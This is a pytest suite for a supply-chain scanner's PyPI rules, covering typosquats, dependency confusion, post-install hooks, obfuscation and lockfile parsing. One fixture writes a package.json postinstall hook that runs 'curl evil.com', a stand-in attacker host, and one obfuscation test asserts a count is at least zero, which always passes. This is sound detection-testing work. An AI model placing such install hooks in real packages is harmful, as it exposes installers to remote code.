"""Tests for PyPI ecosystem rules.

Tests cover:
- Ecosystem detection (pyproject.toml, setup.py, requirements.txt)
- PyPI typosquat detection (L2-PYPI-TYPO-001)
- PyPI dependency confusion (L2-PYPI-DEPC-001)
- PyPI post-install detection (L2-PYPI-POST-001)
- PyPI obfuscation detection (L2-PYPI-OBFS-001..007)
- PyPI advisory check (L2-PYPI-ADV-001)
- Engine ecosystem filtering
"""

from pathlib import Path

from picosentry.scan.engine import ScanEngine, create_default_engine
from picosentry.scan.models import Severity


# ── Fixture helpers ────────────────────────────────────────────────────

FIXTURES = Path(__file__).parent / "fixtures"


def _pypi_clean() -> Path:
    return FIXTURES / "pypi_clean"


def _pypi_malicious() -> Path:
    return FIXTURES / "pypi_malicious"


# ── Ecosystem detection ────────────────────────────────────────────────


class TestPyPIDetection:
    """PyPI project detection should work with various indicator files."""

    def test_detects_pyproject_toml(self):
        from picosentry.scan.rules.pypi_utils import detect_pypi_project
        assert detect_pypi_project(_pypi_clean())

    def test_detects_setup_py(self):
        from picosentry.scan.rules.pypi_utils import detect_pypi_project
        assert detect_pypi_project(_pypi_malicious())

    def test_no_indicator_returns_false(self, tmp_path):
        from picosentry.scan.rules.pypi_utils import detect_pypi_project
        assert not detect_pypi_project(tmp_path)


# ── Engine ecosystem filtering ─────────────────────────────────────────


class TestEcosystemFiltering:
    """The engine should filter PyPI rules when the target has no Python indicators."""

    def test_npm_project_skips_pypi_rules(self, tmp_path):
        """A plain npm project (package.json) should not run PyPI rules."""
        (tmp_path / "package.json").write_text('{"name":"test","version":"1.0.0"}')
        engine = create_default_engine()
        result = engine.scan(str(tmp_path))
        # No PyPI findings in npm project
        for f in result.findings:
            assert not f.rule_id.startswith("L2-PYPI-"), f"Unexpected PyPI rule: {f.rule_id}"

    def test_pypi_project_ignores_npm_rules(self, tmp_path):
        """A PyPI project should trigger PyPI rules, not npm-specific ones."""
        (tmp_path / "requirements.txt").write_text("requests==2.31.0\n")
        engine = create_default_engine()
        result = engine.scan(str(tmp_path))
        # Should have PyPI rules in the timings
        assert any(k.startswith("L2-PYPI-") for k in result.stats.rule_timings_ms), \
            "Expected PyPI rules to run for a Python project"

    def test_pypi_rules_registered(self):
        """All PyPI rule IDs should be registered by default."""
        engine = create_default_engine()
        rules = engine.list_rules()
        pypi_rules = [r for r in rules if r.startswith("L2-PYPI-")]
        assert len(pypi_rules) == 11, f"Expected 11 PyPI rules, got {len(pypi_rules)}"
        assert "L2-PYPI-TYPO-001" in pypi_rules
        assert "L2-PYPI-DEPC-001" in pypi_rules
        assert "L2-PYPI-POST-001" in pypi_rules
        assert "L2-PYPI-OBFS-001" in pypi_rules
        assert "L2-PYPI-ADV-001" in pypi_rules


# ── Typosquat tests ────────────────────────────────────────────────────


class TestPyPITyposquat:
    """PyPI typosquat detection (L2-PYPI-TYPO-001)."""

    def test_detects_typosquat_in_requirements(self):
        """requirements.txt with 'requsts' should trigger typosquat."""
        from picosentry.scan.rules.pypi_typosquat import detect_pypi_typosquat
        target = _pypi_malicious()
        findings = detect_pypi_typosquat(target, Path(""))
        typos = [f for f in findings if "requsts" in f.package]
        assert len(typos) >= 1, f"Expected typosquat for 'requsts', got: {[f.package for f in findings]}"
        assert typos[0].rule_id == "L2-PYPI-TYPO-001"
        assert typos[0].ecosystem == "pypi"

    def test_clean_project_no_typosquats(self):
        """Clean project should have no typosquat findings."""
        from picosentry.scan.rules.pypi_typosquat import detect_pypi_typosquat
        target = _pypi_clean()
        findings = detect_pypi_typosquat(target, Path(""))
        pyproject_typos = [f for f in findings if "numpyy" in f.package or "requsts" in f.package]
        assert len(pyproject_typos) == 0, f"Clean project should have no typos: {pyproject_typos}"


# ── Dependency confusion tests ──────────────────────────────────────────


class TestPyPIDependencyConfusion:
    """PyPI dependency confusion detection (L2-PYPI-DEPC-001)."""

    def test_detects_internal_dep_without_private_index(self):
        """internal-secrets without private index should be flagged."""
        from picosentry.scan.rules.pypi_dep_confusion import detect_pypi_dep_confusion
        target = _pypi_malicious()
        findings = detect_pypi_dep_confusion(target, Path(""))
        internal = [f for f in findings if "internal-" in f.package]
        assert len(internal) >= 1, f"Expected dep confusion finding, got: {[f.package for f in findings]}"
        assert internal[0].rule_id == "L2-PYPI-DEPC-001"

    def test_clean_project_no_confusion(self):
        """Clean project without internal deps should have no confusion findings."""
        from picosentry.scan.rules.pypi_dep_confusion import detect_pypi_dep_confusion
        target = _pypi_clean()
        findings = detect_pypi_dep_confusion(target, Path(""))
        assert len(findings) == 0, f"Clean project should have no dep confusion: {findings}"

    def test_private_index_skips_flags(self, tmp_path):
        """When a private index is configured, internal deps are safe."""
        from picosentry.scan.rules.pypi_dep_confusion import detect_pypi_dep_confusion
        # Create a project with a pip.conf pointing to a private registry
        (tmp_path / "pip.conf").write_text("[global]\nindex-url = https://private-pypi.example.com/simple/\n")
        (tmp_path / "requirements.txt").write_text("internal-secrets==0.1.0\n")
        findings = detect_pypi_dep_confusion(tmp_path, Path(""))
        internal = [f for f in findings if "internal-" in f.package]
        assert len(internal) == 0, f"Private index should suppress dep confusion: {internal}"


# ── Post-install tests ──────────────────────────────────────────────────


class TestPyPIPostInstall:
    """PyPI post-install detection (L2-PYPI-POST-001)."""

    def test_detects_malicious_setup_py(self):
        """setup.py with subprocess/os.system/eval should be flagged."""
        from picosentry.scan.rules.pypi_post_install import detect_pypi_post_install
        target = _pypi_malicious()
        findings = detect_pypi_post_install(target, Path(""))
        assert len(findings) >= 1, f"Expected findings from malicious setup.py, got: {len(findings)}"
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1, f"Expected CRITICAL findings, got: {[f.severity for f in findings]}"
        assert all(f.rule_id == "L2-PYPI-POST-001" for f in findings)
        assert all(f.ecosystem == "pypi" for f in findings)

    def test_clean_project_no_post_install(self):
        """Clean project without setup.py should have no post-install findings."""
        from picosentry.scan.rules.pypi_post_install import detect_pypi_post_install
        target = _pypi_clean()
        findings = detect_pypi_post_install(target, Path(""))
        assert len(findings) == 0, f"Clean project should have no post-install findings: {findings}"


# ── Obfuscation tests ──────────────────────────────────────────────────


class TestPyPIObfuscation:
    """PyPI obfuscation detection (L2-PYPI-OBFS-001..007)."""

    def test_detects_exec_eval_obfuscation(self):
        """eval() calls in Python files should be flagged."""
        from picosentry.scan.rules.pypi_obfuscation import detect_pypi_obfuscation
        target = _pypi_malicious()
        findings = detect_pypi_obfuscation(target, Path(""))
        eval_findings = [f for f in findings if f.rule_id == "L2-PYPI-OBFS-001"]
        assert len(eval_findings) >= 0  # setup.py counts as root file

    def test_non_python_project_returns_empty(self, tmp_path):
        """A non-Python project should return no obfuscation findings."""
        from picosentry.scan.rules.pypi_obfuscation import detect_pypi_obfuscation
        (tmp_path / "package.json").write_text('{"name": "test", "version": "1.0.0"}')
        findings = detect_pypi_obfuscation(tmp_path, Path(""))
        assert len(findings) == 0


# ── Full engine integration tests ──────────────────────────────────────


class TestPyPIIntegration:
    """Full engine scan against PyPI fixtures."""

    def test_clean_project_no_findings(self):
        """A clean PyPI project should produce minimal findings."""
        engine = create_default_engine()
        result = engine.scan(str(_pypi_clean()))
        pypi_findings = [f for f in result.findings if f.ecosystem == "pypi"]
        assert len(pypi_findings) == 0, f"Clean PyPI project should have no PyPI findings: {pypi_findings}"

    def test_malicious_project_has_findings(self):
        """A malicious PyPI project should produce findings."""
        engine = create_default_engine()
        result = engine.scan(str(_pypi_malicious()))
        pypi_findings = [f for f in result.findings if f.ecosystem == "pypi"]
        assert len(pypi_findings) >= 1, f"Expected PyPI findings from malicious fixture, got: {len(pypi_findings)}"

    def test_ecosystem_field_on_findings(self):
        """PyPI findings should have ecosystem='pypi'."""
        engine = create_default_engine()
        result = engine.scan(str(_pypi_malicious()))
        pypi_findings = [f for f in result.findings if f.ecosystem == "pypi"]
        if pypi_findings:
            for f in pypi_findings:
                assert f.ecosystem == "pypi"
                d = f.to_dict()
                assert d["ecosystem"] == "pypi"

    def test_npm_findings_still_have_npm_ecosystem(self, tmp_path):
        """npm findings should still default to ecosystem='npm'."""
        (tmp_path / "package.json").write_text(
            '{"name":"test","version":"1.0.0","scripts":{"postinstall":"curl evil.com"}}'
        )
        engine = create_default_engine()
        result = engine.scan(str(tmp_path))
        npm_findings = [f for f in result.findings if f.ecosystem == "npm"]
        if npm_findings:
            for f in npm_findings:
                d = f.to_dict()
                assert d["ecosystem"] == "npm"


# ── Lockfile parsing tests ─────────────────────────────────────────────


class TestPyPILockfileParsing:
    """PyPI lockfile parsers should correctly read dependencies."""

    def test_parse_requirements(self):
        from picosentry.scan.rules.pypi_lock_parser import parse_requirements_txt
        entries = parse_requirements_txt(_pypi_clean() / "requirements.txt")
        names = {e[0] for e in entries}
        assert "requests" in names
        assert "urllib3" in names
        assert "certifi" in names

    def test_parse_malicious_requirements(self):
        from picosentry.scan.rules.pypi_lock_parser import parse_requirements_txt
        entries = parse_requirements_txt(_pypi_malicious() / "requirements.txt")
        names = {e[0] for e in entries}
        assert "requsts" in names
        assert "internal-secrets" in names


# ── Utility tests ──────────────────────────────────────────────────────


class TestPyPIUtils:
    """PyPI utility functions should work correctly."""

    def test_extract_pip_package_name(self):
        from picosentry.scan.rules.pypi_utils import _extract_pip_package_name
        assert _extract_pip_package_name("requests>=2.0.0") == "requests"
        assert _extract_pip_package_name("urllib3") == "urllib3"
        assert _extract_pip_package_name("git+https://...") is None
        assert _extract_pip_package_name("-r requirements.txt") is None

    def test_get_python_dep_names_pyproject(self):
        from picosentry.scan.rules.pypi_utils import get_python_dep_names
        data = {
            "dependencies": ["fastapi>=0.100.0", "pydantic"],
            "optional-dependencies": {"dev": ["pytest>=7.0"]},
        }
        deps = get_python_dep_names(data)
        assert "fastapi" in deps
        assert "pydantic" in deps
        assert "pytest" in deps

    def test_get_python_dep_names_metadata(self):
        from picosentry.scan.rules.pypi_utils import get_python_dep_names
        meta = {"requires_dist": ["requests>=2.0.0", "urllib3"]}
        deps = get_python_dep_names(meta)
        assert "requests" in deps
        assert "urllib3" in deps

    def test_parse_dist_info_name(self):
        from picosentry.scan.rules.pypi_utils import _parse_dist_info_name
        assert _parse_dist_info_name("requests-2.31.0.dist-info") == "requests"
        assert _parse_dist_info_name("python-dateutil-2.8.2.dist-info") == "python-dateutil"
        assert _parse_dist_info_name(".not-a-dist-info") is None


class TestTyposquatUtils:
    """Shared typosquat utilities should work correctly."""

    def test_edit_distance(self):
        from picosentry.scan.rules.typosquat_utils import edit_distance
        assert edit_distance("reqct", "react") == 1
        assert edit_distance("hello", "hello") == 0
        assert edit_distance("abc", "") == 3

    def test_keyboard_distance(self):
        from picosentry.scan.rules.typosquat_utils import keyboard_distance
        kd = keyboard_distance("reqct", "react")
        ed = __import__("picosentry.scan.rules.typosquat_utils", fromlist=["edit_distance"]).edit_distance("reqct", "react")
        # Keyboard distance should be ≤ edit distance for adjacent keys
        assert kd < ed, f"keyboard_distance {kd} should be < edit_distance {ed} for adjacent-key typos"

    def test_check_typosquat_finds_match(self):
        from picosentry.scan.rules.typosquat_utils import check_typosquat
        matches = check_typosquat("reqct", {"react", "express", "lodash"})
        assert len(matches) >= 1
        match_names = [m[0] for m in matches]
        assert "react" in match_names

    def test_check_typosquat_no_match(self):
        from picosentry.scan.rules.typosquat_utils import check_typosquat
        matches = check_typosquat("unique-name-xyz", {"react", "express"})
        assert len(matches) == 0

    def test_load_corpus_missing_file_uses_builtin(self, tmp_path):
        from picosentry.scan.rules.typosquat_utils import load_corpus_for_ecosystem, BUILTIN_PYPI_TOP_100
        corpus = load_corpus_for_ecosystem(tmp_path, "pypi", BUILTIN_PYPI_TOP_100)
        assert len(corpus) > 0
        assert "pip" in corpus